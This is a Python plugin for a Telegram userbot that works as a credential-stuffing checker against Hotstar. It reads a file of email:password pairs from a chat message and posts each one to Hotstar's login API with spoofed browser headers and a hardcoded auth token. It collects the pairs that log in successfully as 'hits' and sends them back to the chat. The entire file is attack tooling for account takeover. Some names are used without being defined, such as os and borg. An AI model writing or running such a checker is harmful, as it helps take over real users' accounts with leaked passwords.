import json

import requests

from firebot.utils import fire_on_cmd

url = "https://api.hotstar.com/in/aadhar/v2/web/in/user/login"
headers = {
    "content-type": "application/json",
    "Referer": "https://www.hotstar.com/",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0",
    "Accept": "*/*",
    "hotstarauth": "st=1542433344~exp=1542439344~acl=/*~hmac=7dd9deaf6fb16859bd90b1cc84b0d39e0c07b6bb2e174ffecd9cb070a25d9418",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "x-user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0 FKUA/website/41/website/Desktop",
}


@fire.on(fire_on_cmd(pattern="hotstar"))
async def hotstar(event):
    stark_dict = []
    hits_dict = []
    hits = 0
    bads = 0
    lol = await event.get_reply_message()
    starky = await borg.download_media(lol.media, Config.TMP_DOWNLOAD_DIRECTORY)
    file = open(starky, "r")
    lines = file.readlines()
    for line in lines:
        stark_dict.append(line)
    logger.info(stark_dict)
    for i in stark_dict:
        starkm = i.split(":")
        email = starkm[0]
        password = starkm[1]
        print(email)
        print(password)
        payload = {
            "isProfileRequired": "false",
            "userData": {
                "deviceId": "a7d1bc04-f55e-4b16-80e8-d8fbf4c91768",
                "password": password,
                "username": email,
                "usertype": "email",
            },
        }
        try:
            meke = requests.post(url, data=json.dumps(payload), headers=headers)
            logger.info(f"{meke.text} {int(meke.status_code)}")
        except Exception as s:
            await event.edit("**Errors : **" + str(s))
            return
        if meke.status_code == 200:
            hits += 1
            hits_dict.append(f"{email}:{password}")
        else:
            bads += 1
    logger.info(hits_dict)
    if len(hits_dict) == 0:
        await event.edit("No Hits " + meke.text)
        return
    with open("hits.txt", "w") as hitfile:
        for s in hits_dict:
            hitfile.write(s)
    await borg.send_file(
        event.chat_id, "hits.txt", caption=f"**HITS :** `{hits}` \n**BAD :** `{bads}`"
    )
    os.remove(starky)
    os.remove("hits.txt")
